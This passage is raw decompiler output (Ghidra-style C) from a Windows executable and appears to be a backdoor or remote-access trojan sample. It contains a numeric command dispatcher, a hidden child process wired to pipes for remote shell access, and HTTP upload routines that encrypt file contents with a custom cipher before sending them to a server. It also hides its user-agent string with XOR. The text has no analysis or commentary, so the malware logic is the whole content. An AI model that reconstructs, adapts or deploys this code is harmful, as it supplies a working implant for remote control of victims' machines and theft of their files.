            case 0x14:
            case 0x15:
            case 0x16:
            case 0x17:
            case 0x18:
            case 0x19:
            case 0x1a:
            case 0x1b:
            case 0x1c:
            case 0x1d:
            case 0x1e:
            case 0x1f:
            case 0x20:
            case 0x21:
            case 0x22:
            case 0x23:
            case 0x24:
            case 0x25:
            case 0x26:
            case 0x27:
            case 0x28:
            case 0x29:
            case 0x2a:
            case 0x2b:
            case 0x2c:
            case 0x2d:
            case 0x2e:
            case 0x2f:
            case 0x30:
            case 0x31:
            case 0x32:
            case 0x33:
            case 0x34:
            case 0x35:
            case 0x36:
            case 0x37:
            case 0x38:
            case 0x39:
            case 0x3a:
            case 0x3b:
            case 0x3c:
            case 0x3d:
            case 0x3e:
            case 0x3f:
            case 0x40:
            case 0x41:
            case 0x42:
            case 0x43:
            case 0x44:
            case 0x45:
            case 0x46:
            case 0x47:
            case 0x48:
            case 0x49:
            case 0x4a:
            case 0x4b:
            case 0x4c:
            case 0x4d:
            case 0x4e:
            case 0x4f:
            case 0x50:
            case 0x51:
            case 0x52:
            case 0x53:
            case 0x54:
            case 0x55:
            case 0x56:
            case 0x57:
            case 0x58:
            case 0x59:
            case 0x5a:
            case 0x5b:
            case 0x5c:
            case 0x5d:
            case 0x5e:
            case 0x5f:
            case 0x60:
            case 0x61:
            case 0x62:
            case 99:
            case 0x65:
            case 0x67:
            case 0x68:
            case 0x69:
            case 0x6a:
            case 0x6b:
            case 0x6c:
            case 0x6d:
            case 0x6e:
            case 0x6f:
            case 0x70:
            case 0x71:
            case 0x72:
            case 0x73:
            case 0x74:
            case 0x75:
            case 0x76:
            case 0x77:
            case 0x78:
            case 0x79:
            case 0x7a:
            case 0x7b:
            case 0x7c:
            case 0x7d:
            case 0x7e:
            case 0x7f:
            case 0x80:
            case 0x81:
            case 0x82:
            case 0x83:
            case 0x84:
            case 0x85:
            case 0x86:
            case 0x87:
            case 0x88:
            case 0x89:
            case 0x8a:
            case 0x8b:
            case 0x8c:
            case 0x8d:
            case 0x8e:
            case 0x8f:
            case 0x90:
            case 0x91:
            case 0x92:
            case 0x93:
            case 0x94:
            case 0x95:
            case 0x97:
            case 0x98:
              goto switchD_00402c12_caseD_326;
            case 100:
              iVar2 = FUN_004038d0(param_1 + 0x6b4,param_1 + 0x430,0x150);
              if (iVar2 != 0) {
                *(undefined4 *)(param_1 + 0x6ac) = 1;
              }
              FUN_004032c0(param_1 + 0x430,0x150,0);
              break;
            case 0x66:
              FUN_004045bd(param_1 + 0x5aa,&DAT_0040f378);
              *(undefined4 *)(param_1 + 0x6ac) = 1;
              uVar4 = FUN_00402f50(0xf0,10);
              *(undefined4 *)(param_1 + 0x10ec) = uVar4;
              goto switchD_00402c12_caseD_326;
            case 0x96:
              iVar2 = FUN_004021e0(iVar2,uVar4);
              break;
            case 0x99:
              iVar2 = FUN_004018d0(uVar4);
              break;
            default:
              iVar2 = FUN_004016a0(iVar2);
            }
          }
        }
      }
      else if (iVar6 < 0x323) {
        if (iVar6 == 0x322) {
          iVar6 = FUN_00404809(iVar2);
          if (iVar6 != 0) {
            FUN_004045bd(param_1 + 0xee2,iVar2);
            goto switchD_00402a43_caseD_0;
          }
          wsprintfA(local_30c,s_Current___S_0040f40c,param_1 + 0xee2);
          uVar7 = 0xffffffff;
          pcVar8 = local_30c;
          do {
            if (uVar7 == 0) break;
            uVar7 = uVar7 - 1;
            cVar1 = *pcVar8;
            pcVar8 = pcVar8 + 1;
          } while (cVar1 != '\0');
          iVar2 = FUN_004038d0(param_1 + 0x6b4,local_30c,~uVar7 - 1);
        }
        else if (iVar6 < 0x321) {
          if (iVar6 == 800) {
            GetModuleFileNameW((HMODULE)0x0,local_208,0x104);
            iVar2 = FUN_00401f50(local_208,uVar4);
          }
          else if (iVar6 == 0x131) {
            iVar2 = FUN_00401e40(iVar2,uVar4);
          }
          else {
            if (iVar6 != 0x132) break;
            iVar2 = FUN_00401de0(iVar2);
          }
        }
        else {
          if (iVar6 != 0x321) break;
          iVar2 = FUN_00401f50(iVar2,uVar4);
        }
      }
      else {
        switch(iVar6) {
        case 0x323:
          iVar2 = FUN_00401fb0(iVar2);
          break;
        case 0x324:
          iVar2 = FUN_00402190(*(undefined4 *)(param_1 + 0xc));
          break;
        case 0x325:
          iVar6 = FUN_00404c25(iVar2,&DAT_0040f404);
          if (iVar6 == iVar2) {
            iVar2 = FUN_004023c0(iVar2);
          }
          else {
            iVar2 = FUN_004022a0(iVar2);
          }
          break;
        default:
          goto switchD_00402c12_caseD_326;
        case 0x329:
        case 0x32a:
          return 1;
        }
      }
    } while (iVar2 != 0);
switchD_00402c12_caseD_326:
    GetLastError();
  }
  return 0;
}



undefined4 FUN_00402e60(int param_1,undefined4 param_2,undefined4 param_3,undefined4 *param_4)

{
  int iVar1;
  undefined2 *puVar2;
  undefined4 uVar3;
  undefined4 local_4;
  
  local_4 = 0;
  iVar1 = FUN_00404c25(param_1,u_https____0040f5a0);
  if (iVar1 == 0) {
    iVar1 = FUN_00404c25(param_1,u_http____0040f590);
    if (iVar1 != 0) {
      *param_4 = 0x50;
    }
  }
  else {
    local_4 = 1;
    *param_4 = 0x1bb;
  }
  iVar1 = FUN_00404c25(param_1,&DAT_0040f588);
  if (iVar1 != 0) {
    param_1 = iVar1 + 4;
  }
  FUN_004045bd(param_2,param_1);
  puVar2 = (undefined2 *)FUN_00404c25(param_2,&DAT_0040f378);
  if (puVar2 == (undefined2 *)0x0) {
    FUN_004045bd(param_3,&DAT_00412294);
  }
  else {
    FUN_004045bd(param_3,puVar2 + 1);
    *puVar2 = 0;
  }
  puVar2 = (undefined2 *)FUN_00404c25(param_2,&DAT_0040f584);
  if (puVar2 != (undefined2 *)0x0) {
    *puVar2 = 0;
    uVar3 = FUN_0040494e(puVar2 + 1,0,10);
    *param_4 = uVar3;
  }
  return local_4;
}



int FUN_00402f50(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  
  uVar1 = FUN_004046db(0);
  FUN_00404c66(uVar1);
  iVar2 = FUN_00404c70();
  return iVar2 % param_2 + param_1;
}



void FUN_00402f80(ushort *param_1,int param_2,char param_3)

{
  if (0 < param_2) {
    do {
      *param_1 = *param_1 ^ (short)param_3;
      param_1 = param_1 + 1;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  return;
}



bool FUN_00402fa0(UINT param_1,undefined4 param_2,undefined4 param_3,FILEOP_FLAGS param_4)

{
  int iVar1;
  _SHFILEOPSTRUCTW local_430;
  WCHAR local_410;
  undefined2 auStack_40e [259];
  WCHAR local_208;
  undefined2 auStack_206 [259];
  
  FUN_004045bd(&local_410,param_2);
  iVar1 = FUN_00404809(&local_410);
  auStack_40e[iVar1] = 0;
  FUN_004045bd(&local_208,param_3);
  iVar1 = FUN_00404809(&local_208);
  local_430.pFrom = &local_410;
  auStack_206[iVar1] = 0;
  local_430.wFunc = param_1;
  local_430.pTo = &local_208;
  local_430.hwnd = (HWND)0x0;
  local_430.fFlags = param_4;
  iVar1 = SHFileOperationW(&local_430);
  return iVar1 == 0;
}



undefined4 FUN_00403050(void)

{
  HMODULE hModule;
  FARPROC pFVar1;
  HANDLE pvVar2;
  int iVar3;
  char *lpProcName;
  undefined4 *puVar4;
  undefined4 local_4;
  
  lpProcName = s_IsWow64Process_0040f5c8;
  local_4 = 0;
  hModule = GetModuleHandleW(u_kernel32_0040f5b4);
  pFVar1 = GetProcAddress(hModule,lpProcName);
  if (pFVar1 != (FARPROC)0x0) {
    puVar4 = &local_4;
    pvVar2 = GetCurrentProcess();
    iVar3 = (*pFVar1)(pvVar2,puVar4);
    if (iVar3 == 0) {
      return 0;
    }
  }
  return local_4;
}



uint FUN_004030a0(uint param_1)

{
  uint uVar1;
  
  uVar1 = (((((((uint)(byte)(&DAT_0040f4e4)[param_1 >> 0x18 & 0xf] |
               (uint)(byte)(&DAT_0040f4f4)[param_1 >> 0x1c] << 4) << 4 |
              (uint)(byte)(&DAT_0040f4d4)[param_1 >> 0x14 & 0xf]) << 4 |
             (uint)(byte)(&DAT_0040f4c4)[param_1 >> 0x10 & 0xf]) << 4 |
            (uint)(byte)(&DAT_0040f4b4)[param_1 >> 0xc & 0xf]) << 4 |
           (uint)(byte)(&DAT_0040f4a4)[param_1 >> 8 & 0xf]) << 4 |
          (uint)(byte)(&DAT_0040f494)[param_1 >> 4 & 0xf]) << 4;
  return uVar1 >> 0x15 | (uVar1 | (byte)(&DAT_0040f484)[param_1 & 0xf]) << 0xb;
}



undefined4 FUN_00403150(undefined4 *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  uVar1 = *param_2;
  *param_2 = *param_1;
  *param_1 = uVar1;
  return 0;
}



undefined4 FUN_00403170(int *param_1,uint *param_2,int param_3)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  
  piVar2 = &DAT_0040f580;
  iVar3 = 0x20;
  do {
    uVar1 = FUN_004030a0(*(int *)(param_3 + *piVar2 * 4) + *param_1);
    *param_2 = *param_2 ^ uVar1;
    FUN_00403150(param_1,param_2);
    piVar2 = piVar2 + -1;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  FUN_00403150(param_1,param_2);
  return 0;
}



undefined4 FUN_004031c0(int *param_1,uint *param_2,int param_3)

{
  uint uVar1;
  int *piVar2;
  
  piVar2 = &DAT_0040f504;
  do {
    uVar1 = FUN_004030a0(*(int *)(param_3 + *piVar2 * 4) + *param_1);
    *param_2 = *param_2 ^ uVar1;
    FUN_00403150(param_1,param_2);
    piVar2 = piVar2 + 1;
  } while ((int)piVar2 < 0x40f584);
  FUN_00403150(param_1,param_2);
  return 0;
}



undefined4 FUN_00403220(int param_1,undefined4 param_2)

{
  FUN_00403170(param_1,param_1 + 4,param_2);
  return 0;
}



undefined4 FUN_00403240(int param_1,undefined4 param_2)

{
  FUN_004031c0(param_1,param_1 + 4,param_2);
  return 0;
}



undefined4 FUN_00403260(int param_1,int param_2,undefined4 param_3)

{
  byte *pbVar1;
  int iVar2;
  int iVar3;
  
  if (param_1 != 0) {
    iVar2 = 0;
    if (7 < param_2) {
      iVar3 = 8;
      do {
        FUN_00403240(param_1 + -8 + iVar3,&DAT_0040f460);
        iVar3 = iVar3 + 8;
        iVar2 = iVar2 + 8;
      } while (iVar3 <= param_2);
    }
    if (iVar2 < param_2) {
      pbVar1 = &DAT_0040f454;
      do {
        *(byte *)(iVar2 + param_1) = *(byte *)(iVar2 + param_1) ^ *pbVar1;
        iVar2 = iVar2 + 1;
        pbVar1 = pbVar1 + 1;
      } while (iVar2 < param_2);
    }
    return param_3;
  }
  return 0;
}



undefined4 FUN_004032c0(int param_1,int param_2)

{
  byte *pbVar1;
  int iVar2;
  int iVar3;
  
  if (param_1 != 0) {
    iVar2 = 0;
    if (7 < param_2) {
      iVar3 = 8;
      do {
        FUN_00403220(param_1 + -8 + iVar3,&DAT_0040f460);
        iVar3 = iVar3 + 8;
        iVar2 = iVar2 + 8;
      } while (iVar3 <= param_2);
    }
    if (iVar2 < param_2) {
      pbVar1 = &DAT_0040f454;
      do {
        *(byte *)(iVar2 + param_1) = *(byte *)(iVar2 + param_1) ^ *pbVar1;
        iVar2 = iVar2 + 1;
        pbVar1 = pbVar1 + 1;
      } while (iVar2 < param_2);
    }
    return 1;
  }
  return 0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00403380(void)

{
  int iVar1;
  undefined *puVar2;
  int iVar3;
  undefined4 uVar4;
  undefined4 in_stack_00001130;
  
  FUN_00404830();
  FUN_00401040();
  uVar4 = 1;
  iVar1 = FUN_00404d80(in_stack_00001130,&DAT_0040f5dc);
  if (iVar1 != 0) {
    puVar2 = (undefined *)FUN_00404d80(iVar1 + 3,&DAT_0040f5d8);
    if (puVar2 == (undefined *)0x0) {
      _DAT_0040f0e8 = 0x50;
    }
    else {
      *puVar2 = 0;
      _DAT_0040f0e8 = FUN_00404d6f(puVar2 + 1);
    }
    wsprintfW((LPWSTR)&DAT_0040f0a8,(LPCWSTR)&DAT_0040f41c,iVar1 + 3);
    uVar4 = 0;
  }
  iVar1 = 0;
  do {
    if (2 < iVar1) break;
    iVar3 = FUN_00401170(uVar4);
    iVar1 = iVar1 + 1;
  } while (iVar3 == 0);
  FUN_00401100();
  return 0;
}



undefined4 * __fastcall FUN_00403470(undefined4 *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  
  *param_1 = &PTR_FUN_0040d1bc;
  *(undefined *)(param_1 + 9) = 0;
  puVar2 = (undefined4 *)((int)param_1 + 0x26);
  for (iVar1 = 0x82; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  FUN_004045bd((undefined4 *)((int)param_1 + 0x26),u__No_path_is_setted__0040f5de + 1);
  return param_1;
}



undefined4 __thiscall FUN_004034a0(undefined4 param_1_00,byte param_1)

{
  FUN_004034c0();
  if ((param_1 & 1) != 0) {
    FUN_00403d80(param_1_00);
  }
  return param_1_00;
}



void __fastcall FUN_004034c0(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0040d1bc;
  return;
}



undefined4 __fastcall FUN_004034d0(int param_1)

{
  PHANDLE hWritePipe;
  PHANDLE hReadPipe;
  PHANDLE hReadPipe_00;
  BOOL BVar1;
  _SECURITY_ATTRIBUTES local_50;
  _STARTUPINFOW local_44;
  
  hWritePipe = (PHANDLE)(param_1 + 0xc);
  hReadPipe = (PHANDLE)(param_1 + 0x10);
  local_50.nLength = 0xc;
  local_50.bInheritHandle = 1;
  local_50.lpSecurityDescriptor = (LPVOID)0x0;
  BVar1 = CreatePipe(hReadPipe,hWritePipe,&local_50,0x1000);
  if (BVar1 == 0) {
    return 0;
  }
  hReadPipe_00 = (PHANDLE)(param_1 + 8);
  BVar1 = CreatePipe(hReadPipe_00,(PHANDLE)(param_1 + 4),&local_50,0x1000);
  if (BVar1 == 0) {
    CloseHandle(*hWritePipe);
    CloseHandle(*hReadPipe);
    return 0;
  }
  GetStartupInfoW(&local_44);
  local_44.hStdOutput = *hWritePipe;
  local_44.hStdInput = *hReadPipe_00;
  local_44.dwFlags = 0x101;
  local_44.wShowWindow = 0;
  local_44.hStdError = local_44.hStdOutput;
  BVar1 = CreateProcessW((LPCWSTR)(param_1 + 0x26),(LPWSTR)0x0,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,1,0,(LPVOID)0x0,(LPCWSTR)0x0,&local_44,
                         (LPPROCESS_INFORMATION)(param_1 + 0x14));
  if (BVar1 == 0) {
    GetLastError();
    CloseHandle(*(PHANDLE)(param_1 + 4));
    CloseHandle(*hReadPipe_00);
    CloseHandle(*hWritePipe);
    CloseHandle(*hReadPipe);
    return 0;
  }
  *(undefined *)(param_1 + 0x24) = 1;
  return 1;
}



undefined4 __fastcall FUN_004035e0(int param_1)

{
  DWORD DVar1;
  
  if (*(char *)(param_1 + 0x24) == '\0') {
    return 1;
  }
  TerminateThread(*(HANDLE *)(param_1 + 0x18),0);
  TerminateProcess(*(HANDLE *)(param_1 + 0x14),0);
  DVar1 = WaitForSingleObject(*(HANDLE *)(param_1 + 0x14),3);
  if (DVar1 != 0) {
    return 0;
  }
  CloseHandle(*(HANDLE *)(param_1 + 0x14));
  CloseHandle(*(HANDLE *)(param_1 + 0x18));
  CloseHandle(*(HANDLE *)(param_1 + 4));
  CloseHandle(*(HANDLE *)(param_1 + 8));
  CloseHandle(*(HANDLE *)(param_1 + 0xc));
  CloseHandle(*(HANDLE *)(param_1 + 0x10));
  *(undefined *)(param_1 + 0x24) = 0;
  return 1;
}



bool __thiscall FUN_00403660(int param_1_00,char *param_1)

{
  char cVar1;
  BOOL BVar2;
  uint uVar3;
  char *pcVar4;
  
  uVar3 = 0xffffffff;
  pcVar4 = param_1;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar4 + 1;
  } while (cVar1 != '\0');
  BVar2 = WriteFile(*(HANDLE *)(param_1_00 + 4),param_1,~uVar3 - 1,(LPDWORD)&param_1,
                    (LPOVERLAPPED)0x0);
  return BVar2 != 0;
}



undefined4 __thiscall FUN_004036a0(int param_1_00,undefined4 *param_1,uint *param_2)

{
  uint uVar1;
  int iVar2;
  uint *puVar3;
  int iVar4;
  BOOL BVar5;
  uint uVar6;
  undefined4 *puVar7;
  DWORD local_8;
  int local_4;
  
  puVar3 = param_2;
  uVar1 = *param_2;
  puVar7 = param_1;
  for (uVar6 = uVar1 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  for (uVar6 = uVar1 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {
    *(undefined *)puVar7 = 0;
    puVar7 = (undefined4 *)((int)puVar7 + 1);
  }
  *param_2 = 0;
  local_8 = 0;
  param_2 = (uint *)0x0;
  local_4 = 0;
  Sleep(100);
  iVar4 = PeekNamedPipe(*(HANDLE *)(param_1_00 + 0x10),(LPVOID)0x0,0,(LPDWORD)0x0,(LPDWORD)&param_2,
                        (LPDWORD)0x0);
  iVar2 = local_4;
  while( true ) {
    if (iVar4 == 0) {
      return 0;
    }
    local_4 = iVar2;
    if ((param_2 != (uint *)0x0) || (local_4 = iVar2 + 1, 9 < iVar2)) break;
    Sleep(100);
    iVar4 = PeekNamedPipe(*(HANDLE *)(param_1_00 + 0x10),(LPVOID)0x0,0,(LPDWORD)0x0,
                          (LPDWORD)&param_2,(LPDWORD)0x0);
    iVar2 = local_4;
  }
  local_8 = 0;
  BVar5 = PeekNamedPipe(*(HANDLE *)(param_1_00 + 0x10),(LPVOID)0x0,0,(LPDWORD)0x0,(LPDWORD)&param_2,
                        (LPDWORD)0x0);
  if (BVar5 == 0) {
    return 1;
  }
  while( true ) {
    if (param_2 == (uint *)0x0) {
      return 1;
    }
    BVar5 = ReadFile(*(HANDLE *)(param_1_00 + 0x10),(undefined *)(*puVar3 + (int)param_1),
                     uVar1 - *puVar3,&local_8,(LPOVERLAPPED)0x0);
    if (BVar5 == 0) {
      return 0;
    }
    uVar6 = *puVar3;
    *puVar3 = uVar6 + local_8;
    if (local_8 == 0) {
      return 1;
    }
    if (uVar1 <= uVar6 + local_8) break;
    local_8 = 0;
    BVar5 = PeekNamedPipe(*(HANDLE *)(param_1_00 + 0x10),(LPVOID)0x0,0,(LPDWORD)0x0,
                          (LPDWORD)&param_2,(LPDWORD)0x0);
    if (BVar5 == 0) {
      return 1;
    }
  }
  return 1;
}



void __fastcall FUN_00403840(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0040d1c0;
  param_1[3] = 0;
  param_1[2] = 0;
  param_1[1] = 0;
  param_1[4] = 0x8448f300;
  return;
}



undefined4 __thiscall FUN_00403860(undefined4 param_1_00,byte param_1)

{
  FUN_00403880();
  if ((param_1 & 1) != 0) {
    FUN_00403d80(param_1_00);
  }
  return param_1_00;
}



void __fastcall FUN_00403880(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0040d1c0;
  return;
}



undefined4 __thiscall FUN_00403890(int param_1_00,undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  
  iVar1 = InternetConnectW(*(undefined4 *)(param_1_00 + 4),param_1,param_2,0,0,3,0,0);
  *(int *)(param_1_00 + 8) = iVar1;
  if (iVar1 == 0) {
    GetLastError();
    return 0;
  }
  return 1;
}



// WARNING: Could not reconcile some variable overlaps

undefined4 __thiscall FUN_004038d0(int param_1_00,undefined4 param_1,uint param_2,int param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 uStack_c4;
  undefined2 *puStack_c0;
  undefined4 uStack_bc;
  uint uStack_b8;
  int iStack_b4;
  wchar_t **ppwStack_b0;
  undefined2 *puStack_ac;
  wchar_t *pwStack_a8;
  undefined2 local_90;
  undefined2 uStack_8e;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  wchar_t *local_80;
  undefined4 local_7c;
  wchar_t *local_78;
  undefined **local_74;
  undefined **local_70;
  wchar_t *local_6c;
  wchar_t *local_68;
  undefined4 local_64;
  int iStack_34;
  
  pwStack_a8 = *(wchar_t **)(param_1_00 + 0xc);
  if (pwStack_a8 != (wchar_t *)0x0) {
    puStack_ac = (undefined2 *)0x4038ec;
    InternetCloseHandle();
    *(undefined4 *)(param_1_00 + 0xc) = 0;
  }
  local_88 = 0;
  local_80 = (wchar_t *)&DAT_0040f3fc;
  local_7c = 0;
  local_78 = u_text_html_0040f6f8;
  local_74 = &PTR_Rsrc_BIN_66_409_3063809__0040f6cc;
  local_70 = &PTR_Rsrc_BIN_66_409_3063809__0040f6a0;
  local_6c = u_image_webp_0040f688;
  local_68 = u_____q_0_8_0040f674;
  local_64 = 0;
  local_84 = 0;
  local_8c = CONCAT22((short)((uint)DAT_0040f710 >> 0x10),0x54);
  uStack_8e = (undefined2)((uint)DAT_0040f70c >> 0x10);
  local_90 = 0x47;
  if (param_3 != 0) {
    puStack_ac = &local_90;
    pwStack_a8 = u__OS_0040f668;
    ppwStack_b0 = (wchar_t **)0x403973;
    FUN_004045bd();
    ppwStack_b0 = (wchar_t **)0x0;
    iStack_b4 = param_3;
    uStack_b8 = param_2;
    local_90 = 0x50;
    local_8c = CONCAT22(0x54,(undefined2)local_8c);
    *(undefined4 *)(param_1_00 + 0x21c) = 0;
    uStack_bc = 0x40398f;
    FUN_00403260();
  }
  puStack_ac = *(undefined2 **)(param_1_00 + 0x10);
  ppwStack_b0 = &local_80;
  if (param_2 == 0) {
    ppwStack_b0 = &local_78;
  }
  pwStack_a8 = (wchar_t *)0x0;
  uStack_c4 = *(undefined4 *)(param_1_00 + 8);
  iStack_b4 = 0;
  uStack_b8 = 0;
  puStack_c0 = &local_90;
  uStack_bc = param_1;
  iVar1 = HttpOpenRequestW();
  *(int *)(param_1_00 + 0xc) = iVar1;
  if (iVar1 == 0) {
    return 0;
  }
  iStack_b4 = 240000;
  InternetSetOptionW(iVar1,5,&iStack_b4,4);
  InternetSetOptionW(*(undefined4 *)(param_1_00 + 0xc),6,&uStack_c4,4);
  puVar3 = (undefined4 *)u_Content_Type__application_x_www__0040f608;
  puVar4 = (undefined4 *)&stack0xffffff60;
  for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  if (param_2 == 0) {
    uVar2 = 0;
  }
  else {
    uVar2 = FUN_00404809(&stack0xffffff60);
  }
  iVar1 = HttpSendRequestW(*(undefined4 *)(param_1_00 + 0xc),
                           -(uint)(param_2 != 0) & (uint)&stack0xffffff60,uVar2,
                           -(uint)(iStack_34 != 0) & param_2,iStack_34);
  if (iVar1 == 0) {
    GetLastError();
    InternetCloseHandle(*(undefined4 *)(param_1_00 + 0xc));
    *(undefined4 *)(param_1_00 + 0xc) = 0;
    return 0;
  }
  return 1;
}



undefined4 FUN_00403a90(undefined4 param_1,undefined *param_2,undefined4 param_3)

{
  int iVar1;
  BOOL BVar2;
  undefined4 uVar3;
  int extraout_ECX;
  int iVar4;
  undefined4 uVar5;
  int *piVar6;
  HANDLE in_stack_0000100c;
  uint in_stack_00001024;
  uint uStack_34;
  int iStack_10;
  
  FUN_00404830();
  uVar5 = 1;
  iStack_10 = *(int *)(extraout_ECX + 0xc);
  if (iStack_10 != 0) {
    InternetCloseHandle();
    *(undefined4 *)(extraout_ECX + 0xc) = 0;
  }
  iStack_10 = 0;
  param_2 = &DAT_0040f3fc;
  param_3 = 0;
  iVar1 = HttpOpenRequestW();
  *(int *)(extraout_ECX + 0xc) = iVar1;
  if (iVar1 == 0) {
    return 0;
  }
  piVar6 = &iStack_10;
  for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {
    *piVar6 = 0;
    piVar6 = piVar6 + 1;
  }
  uStack_34 = 0;
  iStack_10 = 0x28;
  param_2 = (undefined *)0x0;
  HttpSendRequestExW(iVar1,&iStack_10,0,0);
  uStack_34 = 0;
  *(undefined4 *)(extraout_ECX + 0x21c) = 0;
  if (in_stack_00001024 != 0) {
    do {
      BVar2 = ReadFile(in_stack_0000100c,&param_1,0x1000,&uStack_34,(LPOVERLAPPED)0x0);
      if ((BVar2 == 0) && (uVar5 = 0, uStack_34 = in_stack_00001024, 0x1000 < in_stack_00001024)) {
        uStack_34 = 0x1000;
      }
      in_stack_00001024 = in_stack_00001024 - uStack_34;
      uVar3 = FUN_00403260(&param_1,uStack_34,*(undefined4 *)(extraout_ECX + 0x21c));
      *(undefined4 *)(extraout_ECX + 0x21c) = uVar3;
      iVar1 = InternetWriteFile(*(undefined4 *)(extraout_ECX + 0xc),&param_1,uStack_34,
                                &stack0xffffffd0);
      if (iVar1 == 0) {
        uVar5 = 0;
        break;
      }
    } while (in_stack_00001024 != 0);
  }
  iVar1 = HttpEndRequestW(*(undefined4 *)(extraout_ECX + 0xc),0,0,0);
  if (iVar1 == 0) {
    uVar5 = 0;
  }
  return uVar5;
}



undefined4 FUN_00403c00(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  DWORD DVar2;
  size_t *unaff_EBX;
  void *pvVar3;
  size_t sStack_18;
  undefined4 local_4;
  
  pvVar3 = (void *)0x0;
  sStack_18 = 0;
  local_4 = 0;
  iVar1 = HttpQueryInfoW(param_1,param_2,0,&local_4);
  while( true ) {
    if (iVar1 != 0) {
      *unaff_EBX = sStack_18;
      return 0;
    }
    DVar2 = GetLastError();
    if (DVar2 != 0x7a) break;
    FUN_00404b0a(pvVar3);
    pvVar3 = _malloc(sStack_18);
    if (pvVar3 == (void *)0x0) {
      *unaff_EBX = 0;
      return 0;
    }
    iVar1 = HttpQueryInfoW(param_1,param_2,pvVar3,&sStack_18,0);
  }
  *unaff_EBX = 0;
  FUN_00404b0a(pvVar3);
  return 0;
}



bool __fastcall FUN_00403cb0(int param_1)

{
  BOOL BVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  _OSVERSIONINFOW local_1ec;
  undefined4 local_d0 [52];
  
  local_1ec.dwOSVersionInfoSize = 0x114;
  BVar1 = GetVersionExW(&local_1ec);
  if (BVar1 == 0) {
    local_1ec.dwMajorVersion = 5;
    local_1ec.dwMinorVersion = 1;
  }
  puVar3 = &DAT_0040f720;
  puVar4 = local_d0;
  for (iVar2 = 0x33; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = *(undefined2 *)puVar3;
  FUN_00402f80(local_d0,0x66,0x78);
  wsprintfW((LPWSTR)(param_1 + 0x14),(LPCWSTR)local_d0,local_1ec.dwMajorVersion,
            local_1ec.dwMinorVersion);
  iVar2 = InternetOpenW((LPWSTR)(param_1 + 0x14),0,0,0,0);
  *(int *)(param_1 + 4) = iVar2;
  return iVar2 != 0;
}



void FUN_00403d80(undefined4 param_1)

{
  FUN_00404b0a(param_1);
  return;
}



void FUN_00403db5(void)

{
  FUN_00404552(&DAT_00401030);
  return;
}



void FUN_00403dc1(void)

{
  FUN_00404552(&DAT_00403dcd);
  return;
}



void FUN_00403dce(code *param_1)

{
                    // WARNING: Load size is inaccurate
  ExceptionList = *ExceptionList;
                    // WARNING: Could not recover jumptable at 0x00403df9. Too many branches
                    // WARNING: Treating indirect jump as call
  (*param_1)();
  return;
}



void FUN_00403e02(undefined4 param_1,code *param_2)

{
                    // WARNING: Could not recover jumptable at 0x00403e07. Too many branches
                    // WARNING: Treating indirect jump as call
  (*param_2)();
  return;
}



void FUN_00403e09(undefined4 param_1,code *param_2)

{
                    // WARNING: Could not recover jumptable at 0x00403e0e. Too many branches
                    // WARNING: Treating indirect jump as call
  (*param_2)();
  return;
}



void FUN_00403e10(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  void *pvVar1;
  
  pvVar1 = ExceptionList;
  RtlUnwind(param_1,(PVOID)0x403e38,param_2,(PVOID)0x0);
  param_2->ExceptionFlags = param_2->ExceptionFlags & 0xfffffffd;
  *(void **)pvVar1 = ExceptionList;
  ExceptionList = pvVar1;
  return;
}



undefined4 FUN_00403e5f(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  undefined4 uVar1;
  
  uVar1 = FUN_00405315(param_1,param_2,param_3,param_4);
  return uVar1;
}



undefined4
FUN_00403e95(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4,undefined4 param_5
            )

{
  undefined4 uVar1;
  void *local_18;
  code *local_14;
  undefined4 local_10;
  undefined4 local_c;
  int local_8;
  
  local_10 = param_2;
  local_14 = FUN_00403ee9;
  local_8 = param_4 + 1;
  local_c = param_1;
  local_18 = ExceptionList;
  ExceptionList = &local_18;
  uVar1 = __CallSettingFrame_12(param_3,param_1,param_5);
  ExceptionList = local_18;
  return uVar1;
}



void FUN_00403ee9(undefined4 param_1,int param_2,undefined4 param_3)

{
  FUN_00405315(param_1,*(undefined4 *)(param_2 + 0xc),param_3,0,*(undefined4 *)(param_2 + 8),
               *(undefined4 *)(param_2 + 0x10),param_2,0);
  return;
}



undefined4
FUN_00403f0e(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined4 param_6,undefined4 param_7)

{
  undefined4 *local_34;
  undefined4 local_30;
  undefined4 *local_2c;
  code *local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined *local_10;
  undefined *local_c;
  int local_8;
  
  local_c = &stack0xfffffffc;
  local_10 = &stack0xffffffbc;
  local_28 = FUN_00403fc2;
  local_24 = param_5;
